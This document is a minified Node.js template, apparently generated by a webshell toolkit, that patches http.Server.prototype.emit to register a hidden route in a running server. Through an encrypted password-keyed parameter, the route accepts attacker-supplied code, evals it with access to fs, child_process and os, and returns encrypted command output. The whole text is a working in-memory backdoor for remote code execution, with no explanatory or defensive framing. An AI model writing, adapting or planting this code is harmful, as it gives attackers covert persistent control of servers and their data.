(async()=>{const http=await import('node:http');const url=await import('node:url');const querystring=await import('node:querystring');const originalEmit=http.Server.prototype.emit;http.Server.prototype.emit=function(event,...args){if(event==='request'){const[req,res]=args;const parsedUrl=url.parse(req.url,true);if(parsedUrl.pathname==='/{routePath}'&&(req.method==='GET'||req.method==='POST')){let processData=async function(dataStr){try{const data=base64Decode(dataStr||'');if(!data||data.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'text/plain'});}res.write('ROUTE_ACTIVE');res.end();return;}const decrypted=x(data,false);if(!decrypted||decrypted.length===0){if(!res.headersSent){res.writeHead(200,{'Content-Type':'text/plain'});}res.write('ROUTE_DECRYPT_FAILED');res.end();return;}if(!global['{payloadStoreName}']){const payloadCode=decrypted.toString('utf8');if(payloadCode.includes('class Payload')){try{if(typeof global.require==='undefined'){const fsMod=await import('fs');const pathMod=await import('path');const zlibMod=await import('zlib');const cpMod=await import('child_process');const osMod=await import('os');const cryptoMod=await import('crypto');const moduleCache={'fs':fsMod.default||fsMod,'path':pathMod.default||pathMod,'zlib':zlibMod.default||zlibMod,'child_process':cpMod.default||cpMod,'os':osMod.default||osMod,'crypto':cryptoMod.default||cryptoMod};global.require=function(moduleName){if(moduleCache[moduleName]){return moduleCache[moduleName];}throw new Error('Cannot find module '+moduleName);};}const modifiedPayloadCode=payloadCode+'\nglobal.Payload=Payload;';(0,eval)(modifiedPayloadCode);const PayloadClass=global.Payload;if(!PayloadClass){throw new Error('Payload class not found in global after execution');}global['{payloadStoreName}']=PayloadClass;const okBuffer=Buffer.from('ok','utf8');const encryptedOk=x(okBuffer,true);if(!res.headersSent){res.writeHead(200,{'Content-Type':'text/plain'});}res.write(md5.substring(0,16));res.write(base64Encode(encryptedOk));res.write(md5.substring(16));res.end();return;}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'text/plain'});}res.end('Payload initialization failed: '+e.toString());return;}}else{if(!res.headersSent){res.writeHead(500,{'Content-Type':'text/plain'});}res.end('Payload not initialized. First request must contain payload code.');return;}}const Payload=global['{payloadStoreName}'];const payloadInstance=new Payload();const arrOut=Buffer.alloc(0);payloadInstance.outputStream=arrOut;payloadInstance.formatParameter(decrypted);const result=await payloadInstance.run();let output=Buffer.alloc(0);if(Buffer.isBuffer(result)){output=result;}else{output=Buffer.from(JSON.stringify(result));}const zlib=require('zlib');const gzippedOutput=zlib.gzipSync(output);const encrypted=x(gzippedOutput,true);if(!res.headersSent){res.writeHead(200,{'Content-Type':'text/plain'});}res.write(md5.substring(0,16));res.write(base64Encode(encrypted));res.write(md5.substring(16));res.end();}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'text/plain'});}res.end(e?e.toString():'Error');}};if(req.method==='GET'){const dataValue=parsedUrl.query[pass];if(dataValue){processData(dataValue).catch(()=>{});return true;}}else if(req.method==='POST'){let body='';req.on('data',chunk=>{body+=chunk.toString('utf8');});req.on('end',async()=>{try{if(body){const parsed=querystring.parse(body);const dataValue=parsed[pass];if(dataValue){await processData(decodeURIComponent(dataValue));return;}else{await processData(body);return;}}else{const dataValue=parsedUrl.query[pass];if(dataValue){await processData(dataValue);return;}}}catch(e){if(!res.headersSent){res.writeHead(500,{'Content-Type':'text/plain'});}res.end('Error');}});return true;}if(!res.headersSent){res.writeHead(200,{'Content-Type':'text/plain'});}res.end('Route registered: /{routePath}');return true;}return originalEmit.apply(this,arguments);}})();
